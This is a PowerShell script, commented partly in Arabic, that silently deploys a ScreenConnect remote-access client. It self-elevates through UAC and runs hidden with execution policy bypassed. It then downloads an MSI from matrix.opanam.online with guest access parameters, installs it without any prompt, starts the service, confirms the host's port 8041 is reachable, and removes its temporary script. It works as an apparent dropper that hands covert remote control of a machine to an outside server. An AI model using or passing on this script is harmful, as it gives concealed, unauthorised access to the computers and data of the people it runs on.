# ============================================================
#  ScreenConnect Silent Installer - Ultimate Edition
#  - Self-elevation via UAC
#  - Hidden PowerShell windows
#  - Download with timeout (no hanging)
#  - Service activation & verification
#  - Full logging to file
# ============================================================

$ErrorActionPreference = "Stop"
$Url          = "https://matrix.opanam.online/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$PrimaryDir   = "C:\"
$FallbackDir  = $env:TEMP
$FileName     = "ScreenConnect.ClientSetup.msi"
$LogName      = "ScreenConnect_Install.log"
$LockFile     = Join-Path $env:TEMP "SC_Install.lock"

# ============================================================
#  كشف الصلاحيات
# ============================================================
$currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal   = New-Object Security.Principal.WindowsPrincipal($currentUser)
$isAdmin     = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# ============================================================
#  لو مش Admin → Self-Elevation
# ============================================================
if (-not $isAdmin) {

    # منع تشغيل نسختين
    if (Test-Path $LockFile) {
        $lockAge = (Get-Date) - (Get-Item $LockFile).LastWriteTime
        if ($lockAge.TotalMinutes -lt 15) {
            Write-Host "Another installation is already in progress (lock age: $([int]$lockAge.TotalMinutes) min). Exiting."
            exit 1
        }
        # لو الـ lock قديم، امسحه
        Remove-Item $LockFile -Force -ErrorAction SilentlyContinue
    }
    New-Item -Path $LockFile -ItemType File -Force | Out-Null

    # كود السكربت بصلاحيات Admin
    $elevatedScript = @'
$ErrorActionPreference = "Stop"
$Url          = "https://matrix.opanam.online/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$PrimaryDir   = "C:\"
$FallbackDir  = $env:TEMP
$FileName     = "ScreenConnect.ClientSetup.msi"
$LogName      = "ScreenConnect_Install.log"
$ResultFile   = Join-Path $env:TEMP "SC_Install_Result.txt"

# ---------- Logging ----------
function Write-Log {
    param($Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp] $Message"
    Write-Host $line
    try { Add-Content -Path $ResultFile -Value $line -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
}

# ---------- Download with timeout ----------
function Try-Download {
    param($Dir)

    if (-not (Test-Path $Dir)) {
        Write-Log "Directory '$Dir' does not exist."
        return $null
    }

    $target = Join-Path $Dir $FileName

    # لو الملف موجود، نحاول نمسحه
    if (Test-Path $target) {
        try {
            Remove-Item $target -Force -ErrorAction Stop
            Write-Log "Removed existing file: $target"
        }
        catch {
            Write-Log "Cannot delete '$target': $($_.Exception.Message)"
            Write-Log "Trying fallback directory..."
            return $null
        }
    }

    $webClient = $null
    try {
        Write-Log "Starting download to: $target"

        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

        # إضافة progress tracking
        $global:downloadProgress = 0
        Register-ObjectEvent -InputObject $webClient -EventName DownloadProgressChanged `
            -Action { $global:downloadProgress = $EventArgs.ProgressPercentage } | Out-Null

        $task = $webClient.DownloadFileTaskAsync($Url, $target)

        # timeout 120 ثانية
        $timeoutMs = 120000
        $completed = $task.Wait($timeoutMs)

        if (-not $completed) {
            try { $webClient.CancelAsync() } catch {}
            throw "Download timed out after $($timeoutMs/1000) seconds."
        }

        if ($task.IsFaulted) {
            $errMsg = $task.Exception.InnerException.Message
            throw "Download failed: $errMsg"
        }

        if (-not (Test-Path $target)) {
            throw "File not found after download."
        }

        $size = (Get-Item $target).Length
        Write-Log "Downloaded size: $size bytes ($([math]::Round($size/1MB, 2)) MB)"

        if ($size -lt 100KB) {
            throw "File too small ($size bytes), likely invalid."
        }

        return $target
    }
    catch {
        Write-Log "Failed to download to '$Dir': $($_.Exception.Message)"
        if (Test-Path $target) { Remove-Item $target -Force -ErrorAction SilentlyContinue }
        return $null
    }
    finally {
        if ($webClient) { try { $webClient.Dispose() } catch {} }
    }
}

# ---------- Main ----------
try {
    Write-Log "============================================="
    Write-Log "=== ScreenConnect Installation Started ==="
    Write-Log "============================================="
    Write-Log "Running as: $([Security.Principal.WindowsIdentity]::GetCurrent().Name)"
    Write-Log "Is Admin: $((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))"
    Write-Log "Computer: $env:COMPUTERNAME"
    Write-Log "OS: $((Get-CimInstance Win32_OperatingSystem).Caption)"

    # --- 1) التحميل ---
    $MsiPath = Try-Download -Dir $PrimaryDir

    if (-not $MsiPath) {
        Write-Log "Falling back to TEMP folder..."
        $MsiPath = Try-Download -Dir $FallbackDir
    }

    if (-not $MsiPath -or -not (Test-Path $MsiPath)) {
        throw "Could not download MSI to either C:\ or TEMP."
    }

    Write-Log "MSI downloaded at: $MsiPath"

    # --- 2) التحقق من التوقيع ---
    $bytes = [System.IO.File]::ReadAllBytes($MsiPath)[0..3]
    $signature = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ""
    if ($signature -ne "D0CF11E0") {
        throw "File is not a valid MSI. Signature: $signature"
    }
    Write-Log "File signature OK (valid MSI)."

    # --- 3) مسار اللوج ---
    $InstallLog = Join-Path (Split-Path $MsiPath -Parent) $LogName

    # --- 4) التثبيت ---
    Write-Log "Installing silently..."
    $arguments = "/i `"$MsiPath`" /qn /norestart /L*v `"$InstallLog`""
    Write-Log "Command: msiexec.exe $arguments"

    $proc = Start-Process -FilePath "msiexec.exe" -ArgumentList $arguments -Wait -PassThru -NoNewWindow

    Write-Log "msiexec ExitCode: $($proc.ExitCode)"

    if ($proc.ExitCode -ne 0 -and $proc.ExitCode -ne 3010) {
        throw "Installation failed. ExitCode=$($proc.ExitCode). Check log: $InstallLog"
    }
    Write-Log "Installation successful (ExitCode=$($proc.ExitCode))"

    # --- 5) البحث عن الخدمة ---
    Write-Log "Searching for ScreenConnect service..."
    Start-Sleep -Seconds 5

    $services = Get-Service | Where-Object {
        $_.Name -like "*ScreenConnect*" -or $_.DisplayName -like "*ScreenConnect*"
    }

    if (-not $services) {
        Write-Log "ERROR: No ScreenConnect service found!"
        throw "ScreenConnect service not found."
    }

    foreach ($svc in $services) {
        Write-Log "Found service: $($svc.Name)"
        Write-Log "  DisplayName: $($svc.DisplayName)"
        Write-Log "  Status: $($svc.Status)"
        Write-Log "  StartType: $($svc.StartType)"

        # تشغيل الخدمة لو مش شغالة
        if ($svc.Status -ne "Running") {
            Write-Log "Attempting to start service..."
            try {
                Start-Service -Name $svc.Name -ErrorAction Stop
                Write-Log "Start command sent."
            }
            catch {
                Write-Log "Failed to start: $($_.Exception.Message)"
            }
        }

        # انتظار لحد 60 ثانية
        $waitMax = 60
        $waited = 0
        while ($waited -lt $waitMax) {
            $svc.Refresh()
            if ($svc.Status -eq "Running") { break }
            Start-Sleep -Seconds 3
            $waited += 3
        }

        $svc.Refresh()
        Write-Log "Final status: $($svc.Status) (after ${waited}s)"

        if ($svc.Status -ne "Running") {
            # تفاصيل إضافية
            $svcWmi = Get-CimInstance Win32_Service -Filter "Name='$($svc.Name)'" -ErrorAction SilentlyContinue
            if ($svcWmi) {
                Write-Log "  StartName: $($svcWmi.StartName)"
                Write-Log "  State: $($svcWmi.State)"
                Write-Log "  ExitCode: $($svcWmi.ExitCode)"
                Write-Log "  PathName: $($svcWmi.PathName)"
            }
        }
    }

    # --- 6) اختبار الاتصال ---
    Write-Log "Testing connection to matrix.opanam.online:8041..."
    try {
        $test = Test-NetConnection -ComputerName "matrix.opanam.online" -Port 8041 -WarningAction SilentlyContinue -InformationLevel Quiet
        Write-Log "Server reachable: $test"
    }
    catch {
        Write-Log "Connection test failed: $($_.Exception.Message)"
    }

    # --- 7) التحقق من الاتصال الفعلي ---
    Write-Log "Waiting 20 seconds for service to connect..."
    Start-Sleep -Seconds 20

    # فحص اللوج بتاع Service
    $serviceLogDir = "C:\Program Files (x86)\ScreenConnect Client*"
    $serviceLogs = Get-ChildItem -Path $serviceLogDir -Filter "*.log" -Recurse -ErrorAction SilentlyContinue
    if ($serviceLogs) {
        Write-Log "Service logs found:"
        foreach ($log in $serviceLogs | Select-Object -First 5) {
            Write-Log "  $($log.FullName)"
        }
    }

    Write-Log "============================================="
    Write-Log "=== Installation Completed Successfully ==="
    Write-Log "============================================="
    exit 0
}
catch {
    Write-Log "============================================="
    Write-Log "=== ERROR OCCURRED ==="
    Write-Log "============================================="
    Write-Log "Message: $($_.Exception.Message)"
    Write-Log "StackTrace: $($_.ScriptStackTrace)"
    exit 1
}
finally {
    # تنظيف
    if (Test-Path $ResultFile) {
        try { (Get-Item $ResultFile).LastWriteTime = Get-Date } catch {}
    }
}
'@

    # حفظ وتشغيل بصلاحيات Admin
    $tempScript = Join-Path $env:TEMP "SC_Elevated_$(Get-Random).ps1"
    Set-Content -Path $tempScript -Value $elevatedScript -Encoding UTF8

    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName        = "powershell.exe"
        $psi.Arguments       = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`""
        $psi.Verb            = "RunAs"
        $psi.UseShellExecute = $true
        $psi.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.CreateNoWindow  = $true

        $proc = [System.Diagnostics.Process]::Start($psi)
        $proc.WaitForExit()

        Start-Sleep -Seconds 2
        Remove-Item $tempScript -Force -ErrorAction SilentlyContinue
        Remove-Item $LockFile -Force -ErrorAction SilentlyContinue

        exit $proc.ExitCode
    }
    catch {
        Remove-Item $tempScript -Force -ErrorAction SilentlyContinue
        Remove-Item $LockFile -Force -ErrorAction SilentlyContinue
        exit 1
    }
}

Write-Host "Already running as Administrator."
